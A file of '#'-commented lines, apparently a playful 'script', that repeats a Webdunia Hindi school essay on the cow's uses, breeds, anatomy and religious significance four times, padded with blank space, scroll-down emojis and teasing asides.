#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ












#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो







#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो








#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
